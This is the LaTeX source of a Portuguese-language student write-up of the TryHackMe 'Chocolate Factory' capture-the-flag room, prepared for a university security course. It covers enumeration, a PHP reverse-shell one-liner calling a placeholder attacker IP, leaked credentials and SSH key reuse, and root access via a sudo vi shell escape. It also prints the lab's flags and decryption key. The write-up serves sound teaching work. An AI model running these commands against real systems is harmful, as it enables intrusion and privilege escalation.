%==============================================================================
% Write-Up de CTF - Chocolate Factory (TryHackMe)
% Materia : CIC0087 - Topicos Avancados em Computadores - Turma 04 - 2026/2
% Depto.  : Departamento de Ciencias da Computacao
% Baseado na "Metodologia para Construcao de Write-Ups em CTF"
%
% Compilacao:  pdflatex main.tex   (rodar 2x para atualizar o Sumario)
%==============================================================================
\documentclass[12pt,a4paper]{article}

%------------------------- Codificacao e idioma -------------------------------
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[brazil]{babel}

%------------------------- Fonte Times New Roman ------------------------------
\usepackage{newtxtext}   % corpo em Times
\usepackage{newtxmath}   % matematica em Times

%------------------------- Margens (minimo 2 cm) ------------------------------
\usepackage[a4paper,margin=2cm,headheight=15pt,includehead,includefoot]{geometry}

%------------------------- Utilitarios ----------------------------------------
\usepackage{graphicx}
\graphicspath{{img/}{./img/}}
\usepackage{xcolor}
\usepackage{float}
\usepackage[hidelinks]{hyperref}
\usepackage{fancyhdr}
\usepackage{listings}
\usepackage[most]{tcolorbox}
\usepackage{caption}
\usepackage{enumitem}
\usepackage{setspace}

\hypersetup{
  colorlinks=true,
  linkcolor=black,
  urlcolor=blue!60!black,
  citecolor=black
}
\onehalfspacing

%============================= METADADOS =======================================
\newcommand{\desafioNome}{Chocolate Factory}
\newcommand{\plataforma}{TryHackMe}
\newcommand{\dificuldade}{Fácil}
\newcommand{\dataResolucao}{03/10/2026}
\newcommand{\autorNome}{Luís Eduardo Curi Serra}

% Dados academicos (fixos para a disciplina)
\newcommand{\materia}{CIC0087 -- Tópicos Avançados em Computadores -- Turma 04 -- 2026/2}
\newcommand{\departamento}{Departamento de Ciências da Computação}
\newcommand{\matricula}{251033574}
\newcommand{\professor}{Roberto Rodrigues Filho}
\newcommand{\universidade}{Universidade de Brasília}
%===============================================================================

%------------------------- Cabecalho e rodape ---------------------------------
\pagestyle{fancy}
\fancyhf{}
\lhead{\small\itshape \desafioNome}
\rhead{\small\itshape \autorNome}
\lfoot{\small \materia}
\rfoot{\small Página \thepage}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0.4pt}

%------------------------- Estilo dos blocos de codigo ------------------------
\definecolor{codebg}{gray}{0.95}
\definecolor{codeframe}{gray}{0.75}
\definecolor{cmt}{RGB}{100,120,100}
\definecolor{kw}{RGB}{0,0,150}
\definecolor{str}{RGB}{150,50,50}

\lstdefinestyle{shell}{
  backgroundcolor=\color{codebg},
  basicstyle=\ttfamily\small,
  keywordstyle=\color{kw}\bfseries,
  commentstyle=\color{cmt}\itshape,
  stringstyle=\color{str},
  frame=single,
  rulecolor=\color{codeframe},
  breaklines=true,
  breakatwhitespace=false,
  postbreak=\mbox{\textcolor{codeframe}{$\hookrightarrow$}\space},
  columns=fullflexible,
  keepspaces=true,
  showstringspaces=false,
  tabsize=2,
  captionpos=b,
  xleftmargin=0.4em,
  xrightmargin=0.4em,
  aboveskip=1em,
  belowskip=1em,
}
\lstset{style=shell}

% Atalho: comando de terminal em linha
\newcommand{\cmd}[1]{\lstinline[style=shell]|#1|}

% Ambiente para OUTPUT (fundo levemente diferente, fonte menor)
\lstdefinestyle{output}{
  style=shell,
  backgroundcolor=\color{gray!8},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\ttfamily,
}

%------------ Caixa de "becos sem saida" (tentativas sem sucesso) --------------
\definecolor{deadendbg}{RGB}{255,248,240}
\definecolor{deadendframe}{RGB}{193,108,44}
\newtcolorbox{becosemsaida}[1][Tentativas sem sucesso (becos sem saída)]{%
  enhanced, breakable,
  colback=deadendbg, colframe=deadendframe,
  colbacktitle=deadendframe, coltitle=white,
  boxrule=0.6pt, arc=2pt,
  left=8pt, right=8pt, top=6pt, bottom=6pt,
  fonttitle=\bfseries\small,
  title={#1}%
}

%===============================================================================
\begin{document}

%============================= 2.1 CAPA =========================================
\begin{titlepage}
  \thispagestyle{empty}
  \centering
  {\scshape \universidade \par}
  {\scshape \departamento \par}
  \vspace{0.4cm}
  {\small \materia \par}
  \vspace{2.5cm}

  \rule{\linewidth}{0.4pt}\par
  \vspace{0.6cm}
  {\huge \bfseries Write-Up: \desafioNome \par}
  \vspace{0.4cm}
  {\large Segurança Ofensiva --- Capture The Flag \par}
  \vspace{0.6cm}
  \rule{\linewidth}{0.4pt}\par

  \vspace{2.0cm}
  \begin{tabular}{rl}
    \textbf{Plataforma:}       & \plataforma       \\[4pt]
    \textbf{Dificuldade:}      & \dificuldade      \\[4pt]
    \textbf{Data de resolução:}& \dataResolucao    \\
  \end{tabular}

  \vfill

  \begin{tabular}{rl}
    \textbf{Autor:}     & \autorNome  \\[4pt]
    \textbf{Matrícula:} & \matricula  \\[4pt]
    \textbf{Professor:} & \professor  \\
  \end{tabular}

  \vspace{1.2cm}
  {\small \today \par}
\end{titlepage}

%============================= 2.2 SUMARIO ======================================
\newpage
\tableofcontents
\thispagestyle{fancy}
\newpage

%============================= 2.3 VISAO GERAL ==================================
\section{Visão Geral}
\textbf{Chocolate Factory} é uma máquina Linux de dificuldade \emph{fácil} com
temática do filme \emph{A Fantástica Fábrica de Chocolate}. A varredura revela
\textbf{11 portas abertas}, mas a maioria é \emph{isca}: diversos serviços
(portas 100, 106, 109, 110, 119, 125) respondem sempre com o mesmo \emph{banner}
``\emph{chocolate room}'' mandando ``\emph{procurar em outro lugar}''. O caminho
real combina \textbf{FTP anônimo}, \textbf{enumeração web} e \textbf{reutilização
de credenciais}. A enumeração com Gobuster expõe \emph{directory listing}, que
revela um binário ELF (\texttt{key\_rev\_key}) contendo uma chave, o
\texttt{validate.php} com as credenciais de \texttt{charlie} em texto puro e um
\emph{command panel} (\texttt{home.php}) usado para obter um \emph{reverse
shell}. As credenciais de \texttt{charlie} e uma \textbf{chave SSH privada}
deixada no \emph{home} dão acesso interativo e a \emph{flag} de usuário. A
escalada se dá por uma política de \texttt{sudo} perigosa (\texttt{charlie} pode
executar \texttt{/usr/bin/vi}), que permite \emph{shell escape} para
\texttt{root}. A \emph{flag} final não está em texto: um script Python
(\texttt{root.py}) a descriptografa via \emph{Fernet}, usando exatamente a chave
encontrada no binário do início.

%============================= 2.4 RECONHECIMENTO ===============================
\section{Reconhecimento}

\subsection{Varredura de portas}
\begin{lstlisting}[language=bash,caption={Varredura de portas e serviços com Nmap.}]
nmap -T4 <TARGET_IP>
\end{lstlisting}

A varredura retorna \textbf{11 portas abertas}. Na prática, apenas três
importam --- \textbf{21/FTP}, \textbf{22/SSH} e \textbf{80/HTTP}; as demais são
iscas (ver seção de becos sem saída).

\begin{lstlisting}[style=output,caption={Portas abertas retornadas pela varredura.}]
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
100/tcp open  newacct
106/tcp open  pop3pw
109/tcp open  pop2
110/tcp open  pop3
111/tcp open  rpcbind
113/tcp open  ident
119/tcp open  nntp
125/tcp open  locus-map
\end{lstlisting}

\subsection{FTP anônimo}
O FTP aceita \emph{login} \texttt{anonymous} (senha vazia). Baixam-se todos os
arquivos de uma vez desativando a confirmação interativa.

\begin{lstlisting}[language=bash,caption={Login anônimo e download em massa no FTP.}]
ftp <TARGET_IP> 21
# Name: anonymous   (senha vazia, apenas Enter)
ftp> prompt off          # desativa confirmacao do mget
ftp> mget *              # baixa tudo -> gum_room.jpg
\end{lstlisting}

O único arquivo é \texttt{gum\_room.jpg}, que \textbf{não contém informação
útil} para o progresso.

\subsection{Enumeração web}
A porta 80 serve uma página de \emph{login} (\texttt{index.html}). A enumeração
de diretórios/arquivos com Gobuster (incluindo extensões) encontra o
\texttt{home.php}.

\begin{lstlisting}[language=bash,caption={Enumeração com Gobuster.}]
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
\end{lstlisting}

\begin{lstlisting}[style=output,caption={Achados relevantes do Gobuster.}]
home.php    (Status: 200) [Size: 569]
index.html  (Status: 200) [Size: 1466]
\end{lstlisting}

Com \emph{directory listing} habilitado, o servidor expõe a lista completa de
arquivos da aplicação:

\begin{lstlisting}[style=output,caption={Arquivos expostos pelo directory listing.}]
home.jpg  home.php  image.png  index.html  index.php.bak  key_rev_key  validate.php
\end{lstlisting}

%============================= 2.5 EXPLORACAO ===================================
\section{Exploração}

\subsection{Extração da chave do binário ELF}
O arquivo \texttt{key\_rev\_key} é um executável \textbf{ELF}. Inspecionando seu
conteúdo (o ideal é \cmd{strings key_rev_key}), encontra-se uma chave embutida
--- que só fará sentido no final, na etapa de \texttt{root}.

\begin{lstlisting}[style=output,caption={Chave embutida no binário key\_rev\_key.}]
congratulations you have found the key:
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
\end{lstlisting}

\subsection{Reverse shell e coleta de credenciais}
A página \texttt{home.php} contém um ponto de \textbf{execução de comandos}: o
texto enviado é executado no servidor. Abre-se um \emph{listener} Netcat na
máquina atacante e, pelo campo de comando do \texttt{home.php}, dispara-se um
\emph{reverse shell} em PHP, obtendo \emph{shell} como \texttt{www-data}.

\begin{lstlisting}[language=bash,caption={Listener Netcat na maquina atacante.}]
nc -l -v -n -p 1234
\end{lstlisting}

\begin{lstlisting}[language=bash,caption={Comando executado no home.php (reverse shell PHP).}]
php -r '$sock=fsockopen("<ATTACKER_IP>",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
\end{lstlisting}

Já no \emph{shell}, a leitura de \texttt{validate.php} expõe as credenciais em
\textbf{texto puro}:

\begin{lstlisting}[style=output,caption={validate.php com credenciais hardcoded.}]
if($uname=="charlie" && $password=="cn7824"){
    echo "<script>window.location='home.php'</script>";
}
\end{lstlisting}

\begin{center}
\fbox{\texttt{charlie : cn7824}}
\end{center}

\subsection{Acesso via SSH e flag de usuário}
No \emph{home} de \texttt{charlie} há um par de chaves SSH (\texttt{teleport} e
\texttt{teleport.pub}). Copia-se a chave privada para a máquina atacante, ajusta-se
a permissão e autentica-se via SSH --- sem necessidade de senha.

\begin{lstlisting}[language=bash,caption={Acesso via chave SSH privada e leitura da flag de usuário.}]
# chave privada 'teleport' salva localmente como id_rsa
chmod 600 id_rsa
ssh -i id_rsa charlie@<TARGET_IP>

cat /home/charlie/user.txt
# flag{cd5509042371b34e4826e4838b522d2e}
\end{lstlisting}

%======================== 2.6 ESCALADA DE PRIVILEGIOS ==========================
\section{Escalada de Privilégios}

\subsection{Enumeração local}
\begin{lstlisting}[style=output,caption={Politica de sudo de charlie.}]
User charlie may run the following commands on ip-<HOST>:
    (ALL : !root) NOPASSWD: /usr/bin/vi
\end{lstlisting}

\texttt{charlie} pode executar \texttt{/usr/bin/vi} via \texttt{sudo} sem senha
--- um \emph{shell escape} clássico (GTFOBins).

\subsection{Shell escape via vi}
\begin{lstlisting}[language=bash,caption={Escalada a root pelo vi.}]
sudo vi
# dentro do vi: tecla ESC, depois digitar  :shell  e Enter
# -> shell como root
\end{lstlisting}

\subsection{Flag de root: decriptação Fernet}
Em \texttt{/root} não há \texttt{root.txt}, e sim um script \texttt{root.py} que
descriptografa a \emph{flag} com \emph{Fernet}, exigindo a chave obtida no
binário do início (\texttt{-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=}). O
script, como estava, não roda --- foi necessário corrigi-lo em dois pontos (ver
becos sem saída). A versão final:

\begin{lstlisting}[language=Python,caption={root.py corrigido (mensagem como bytes e displays comentados).}]
from cryptography.fernet import Fernet
key = input("Enter the key:  ")
f = Fernet(key)
encrypted_mess = b'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess = f.decrypt(encrypted_mess)
print(dcrypt_mess.decode())
\end{lstlisting}

\begin{lstlisting}[style=output,caption={Execução final: flag de root.}]
# python3 root.py
Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
flag{cec59161d338fef787fcb4e296b42124}
\end{lstlisting}

%==================== 2.7 DEAD-ENDS / PERDAS DE TEMPO ==========================
\section{Becos sem Saída e Perdas de Tempo}
Esta seção consolida, de forma breve, todos os pontos em que a análise travou ou
consumiu tempo sem retorno.

\begin{becosemsaida}
\begin{itemize}[leftmargin=1.4em,itemsep=4pt,topsep=2pt]
  \item \textbf{Portas-isca (maior perda de tempo).} Das 11 portas abertas, seis
        (\texttt{100/newacct}, \texttt{106/pop3pw}, \texttt{109/pop2},
        \texttt{110/pop3}, \texttt{119/nntp}, \texttt{125/locus-map}) são falsos
        serviços: ao conectar com \cmd{nc} ou enviar comandos de protocolo (ex.:
        \cmd{echo "NEWACCT luisserra" | nc <IP> 100}), todas devolvem o
        \emph{mesmo banner} ``\emph{Welcome to chocolate room!! [...] Look
        somewhere else, its not here! ;)}''. Tempo gasto testando cada porta
        individualmente antes de concluir que eram distração.
  \item \textbf{\texttt{gum\_room.jpg} (FTP).} A imagem baixada do FTP não levou a
        nada --- típico chamariz para \emph{esteganografia}. Inspecioná-la foi
        esforço sem retorno para esta trilha de solução.
  \item \textbf{\texttt{cat} em binário ELF.} A chave foi buscada com \cmd{cat
        key_rev_key}, poluindo o terminal com bytes binários; \cmd{strings
        key_rev_key} teria isolado a chave de imediato.
  \item \textbf{\texttt{root.py} --- erro 1 (\emph{token must be bytes}).} A
        \texttt{encrypted\_mess} estava como \emph{string}; o Fernet exige
        \emph{bytes}. Correção: prefixar o literal com \texttt{b'...'}.
  \item \textbf{\texttt{root.py} --- erro 2 (\emph{pyfiglet has no attribute
        figlet\_format}).} A versão do \texttt{pyfiglet} no alvo não expõe
        \texttt{figlet\_format}. Correção: comentar as linhas de \emph{display}
        decorativo (\texttt{pyfiglet}), que são irrelevantes para a \emph{flag}.
\end{itemize}
\end{becosemsaida}

%============================= 2.8 CONCLUSAO ====================================
\section{Conclusão}
O comprometimento encadeou várias más configurações: \textbf{FTP anônimo},
\textbf{directory listing} expondo o código-fonte e um binário com chave
embutida, \textbf{credenciais \emph{hardcoded}} em \texttt{validate.php}, uma
\textbf{chave SSH privada} deixada no \emph{home} do usuário e, por fim, uma
\textbf{política de \texttt{sudo}} que permitia \emph{shell escape} via
\texttt{vi}. O principal obstáculo \emph{não técnico} foram as \textbf{portas-isca}:
reconhecer cedo que os serviços da família POP/NNTP eram falsos
(banner idêntico ``\emph{look somewhere else}'') teria economizado tempo
considerável. As duas \emph{flags} obtidas foram
\texttt{flag\{cd5509042371b34e4826e4838b522d2e\}} (usuário) e
\texttt{flag\{cec59161d338fef787fcb4e296b42124\}} (root).

%============================= 2.9 REFERENCIAS =================================
\section{Referências}
\begin{itemize}[leftmargin=1.5em]
  \item TryHackMe --- Sala \emph{Chocolate Factory} ---
        \url{https://tryhackme.com/room/chocolatefactory}
  \item GTFOBins --- \texttt{vi} ---
        \url{https://gtfobins.github.io/gtfobins/vi/}
  \item \emph{cryptography} (Fernet) ---
        \url{https://cryptography.io/en/latest/fernet/}
\end{itemize}

\end{document}
